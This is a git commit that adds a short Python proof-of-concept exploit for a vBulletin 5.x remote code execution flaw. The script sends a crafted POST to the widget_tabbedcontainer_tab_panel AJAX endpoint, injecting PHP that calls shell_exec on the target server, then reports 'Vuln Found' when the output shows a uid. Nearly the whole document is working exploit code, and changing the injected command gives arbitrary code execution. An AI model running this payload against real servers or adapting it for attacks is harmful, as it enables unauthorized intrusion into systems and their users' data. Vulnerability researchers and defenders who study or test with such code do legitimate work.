9f3851a4e8d1a9527d702e7099a4100c490e34fe
ludy-dev <70466565+ludy-dev@users.noreply.github.com>
2020-09-03 23:41:59 +0900

    vBulletin_5.x-tab_panel-RCE.py

---
+++ vBulletin_5.x-tab_panel-RCE.py
@@ -0,0 +1,23 @@
+import re
+import requests
+import sys
+import os
+
+if len(sys.argv) < 3:
+        print 'Usage: python %s <dst_ip> <port>' % os.path.basename(sys.argv[0])
+        sys.exit()
+address =(sys.argv[1], sys.argv[2])
+dst_addr=":".join(address)
+print(dst_addr)
+URL="http://"+dst_addr+"/ajax/render/widget_tabbedcontainer_tab_panel"
+data ="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec(\"id\"); exit;"
+res = requests.post(URL, data=data)
+response = res.text
+
+p = re.compile('uid=\d')
+m = p.match(response)
+print("Status Code : %d"% res.status_code)
+if m:
+        print("Vuln Found")
+else:
+        print("Not Found")
